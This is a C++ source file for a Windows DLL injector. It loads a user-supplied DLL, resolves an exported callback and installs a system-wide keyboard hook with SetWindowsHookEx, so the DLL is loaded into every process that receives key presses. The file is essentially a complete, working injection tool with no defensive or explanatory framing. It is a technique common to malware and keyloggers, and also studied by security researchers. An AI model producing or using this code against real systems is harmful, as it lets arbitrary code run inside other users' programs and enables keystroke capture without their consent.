#include <Windows.h>
#include <cstdio>

/**
* DLL injection using SetWindowsHookEx. Triggering the injection requires key presses.
* Ensure that you trigger injection on a program with the correct architecture (x86, x64) 
* Supports 32- and 64 Bit applications.
*/
int main(int argc, char* argv[])
{
	char* dllPath;

	if (argc != 2)
	{
		printf("Usage: *.exe absoluteDllPath\n");
		return 1;
	}

	dllPath = argv[1];

	// load library to be injected
	HMODULE dllHandle = LoadLibrary(dllPath);
	if (!dllHandle) 
	{
		printf("[Error] %d - Failed to load dll %s\n", GetLastError(), dllPath);
		return 1;
	}

	printf("[Info] - Loaded library %s\n", dllPath);

	// resolve SetWindowsHookCallback
	HOOKPROC windowsHookCallback = (HOOKPROC)GetProcAddress(dllHandle, "SetWindowsHookCallback");
	if (!windowsHookCallback)
	{
		printf("[Error] %d - Failed to resolve the SetWindowsHookCallback\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resolved SetWindowsHook callback\n");

	// install the hook
	HHOOK hookHandle = SetWindowsHookEx(WH_KEYBOARD, windowsHookCallback, dllHandle, 0);
	if (!hookHandle)
	{
		printf("[Error] %d - Failed to install hook\n", GetLastError());
		return 1;
	}

	printf("[Info] - Installed hook\n");

	// wait for a chacter press to unhook
	getchar();

	// unhook
	UnhookWindowsHookEx(hookHandle);

	return 0;
}